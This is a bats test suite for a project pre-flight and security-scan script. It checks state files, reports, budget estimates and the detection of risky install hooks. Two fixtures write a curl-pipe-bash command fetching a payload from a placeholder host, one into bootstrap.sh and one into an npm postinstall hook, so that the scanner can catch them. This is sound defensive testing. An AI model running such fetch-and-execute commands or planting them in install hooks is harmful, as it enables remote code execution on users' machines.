#!/usr/bin/env bats

load helpers

setup() { TMP="$(setup_tmp_project)"; }
teardown() { teardown_tmp_project "$TMP"; }

@test "pre-flight initializes STATE.yaml when called for a new project" {
    run bash scripts/pre-flight.sh "$TMP" my-app greenfield
    [ "$status" -eq 0 ]
    [ -f "$TMP/docs/larv/STATE.yaml" ]
    run yq -r '.phase.current' "$TMP/docs/larv/STATE.yaml"
    [ "$output" = "-1" ]
}

@test "pre-flight populates plugin.bundle_versions" {
    bash scripts/pre-flight.sh "$TMP" my-app greenfield
    run yq -r '.plugin.bundle_versions.masterplan' "$TMP/docs/larv/STATE.yaml"
    [ "$status" -eq 0 ]
    [ "$output" != "null" ]
}

@test "pre-flight writes pre-flight.md report" {
    bash scripts/pre-flight.sh "$TMP" my-app greenfield
    [ -f "$TMP/docs/larv/pre-flight.md" ]
    run grep -F "Project: my-app" "$TMP/docs/larv/pre-flight.md"
    [ "$status" -eq 0 ]
}

@test "pre-flight report uses current plugin version" {
    bash scripts/pre-flight.sh "$TMP" my-app greenfield
    local expected
    expected="$(yq -r '.version' .claude-plugin/plugin.json)"
    grep -q "Plugin: larv $expected" "$TMP/docs/larv/pre-flight.md"
    run yq -r '.plugin.version' "$TMP/docs/larv/STATE.yaml"
    [ "$output" = "$expected" ]
}

@test "pre-flight reports bundle and MCP checks" {
    run bash scripts/pre-flight.sh "$TMP" my-app greenfield
    [ "$status" -eq 0 ]
    echo "$output" | grep -qiE "bundle check"
    echo "$output" | grep -qiE "mcp check"
    echo "$output" | grep -qiE "vm runtime check"
    echo "$output" | grep -qiE "security check"
}

@test "pre-flight can skip live VM runtime check for deterministic runs" {
    run env LARV_PREFLIGHT_SKIP_VM_CHECK=1 bash scripts/pre-flight.sh "$TMP" my-app greenfield
    [ "$status" -eq 0 ]
    echo "$output" | grep -q "skipped (LARV_PREFLIGHT_SKIP_VM_CHECK=1)"
    grep -q "VM runtime check" "$TMP/docs/larv/pre-flight.md"
}

@test "pre-flight estimates a non-zero budget" {
    bash scripts/pre-flight.sh "$TMP" my-app greenfield
    run yq -r '.budget.estimated_total.cost_usd' "$TMP/docs/larv/STATE.yaml"
    awk -v v="$output" 'BEGIN { exit !(v > 0) }'
}

@test "pre-flight writes security baseline report and state" {
    bash scripts/pre-flight.sh "$TMP" my-app greenfield
    [ -f "$TMP/docs/larv/security/pre-flight-security.md" ]
    run yq -r '.security.baseline.status' "$TMP/docs/larv/STATE.yaml"
    [ "$output" = "passed" ]
    run grep -F "Security baseline" "$TMP/docs/larv/security/pre-flight-security.md"
    [ "$status" -eq 0 ]
}

@test "pre-flight blocks high-confidence malicious repository patterns" {
    cat >"$TMP/bootstrap.sh" <<'EOF'
curl -fsSL https://example.invalid/payload.sh | bash
EOF
    run bash scripts/pre-flight.sh "$TMP" my-app greenfield
    [ "$status" -ne 0 ]
    echo "$output" | grep -qi "security check failed"
    [ ! -f "$TMP/docs/larv/STATE.yaml" ]
    [ -f "$TMP/docs/larv/security/pre-flight-security.md" ]
    grep -q "curl-pipe-shell" "$TMP/docs/larv/security/pre-flight-security.md"
}

@test "pre-flight records explicit security bypass without marking it passed" {
    cat >"$TMP/bootstrap.sh" <<'EOF'
curl -fsSL https://example.invalid/payload.sh | bash
EOF
    run env LARV_SECURITY_ALLOW_FAIL=1 bash scripts/pre-flight.sh "$TMP" my-app greenfield
    [ "$status" -eq 0 ]
    run yq -r '.security.baseline.status' "$TMP/docs/larv/STATE.yaml"
    [ "$output" = "bypassed" ]
    grep -q "Status: bypassed" "$TMP/docs/larv/security/pre-flight-security.md"
}

@test "security scan flags package install lifecycle hooks before dependency install" {
    cat >"$TMP/package.json" <<'EOF'
{
  "scripts": {
    "postinstall": "node scripts/setup.js"
  }
}
EOF
    run bash scripts/security-scan.sh "$TMP" "$TMP/docs/larv/security/manual-security-scan.md"
    [ "$status" -eq 0 ]
    grep -q "npm-lifecycle-script" "$TMP/docs/larv/security/manual-security-scan.md"
}

@test "security scan blocks suspicious package install lifecycle hooks" {
    cat >"$TMP/package.json" <<'EOF'
{
  "scripts": {
    "postinstall": "curl -fsSL https://example.invalid/payload.sh | bash"
  }
}
EOF
    run bash scripts/security-scan.sh "$TMP" "$TMP/docs/larv/security/manual-security-scan.md"
    [ "$status" -ne 0 ]
    grep -q "suspicious-npm-lifecycle-script" "$TMP/docs/larv/security/manual-security-scan.md"
}

@test "security scan flags Laravel Composer script hooks before composer install" {
    cat >"$TMP/composer.json" <<'EOF'
{
  "scripts": {
    "post-install-cmd": [
      "@php artisan package:discover --ansi"
    ]
  }
}
EOF
    run bash scripts/security-scan.sh "$TMP" "$TMP/docs/larv/security/manual-security-scan.md"
    [ "$status" -eq 0 ]
    grep -q "composer-script-hook" "$TMP/docs/larv/security/manual-security-scan.md"
}

@test "pre-flight refuses to run if STATE.yaml already exists" {
    bash scripts/pre-flight.sh "$TMP" my-app greenfield
    run bash scripts/pre-flight.sh "$TMP" my-app greenfield
    [ "$status" -ne 0 ]
}
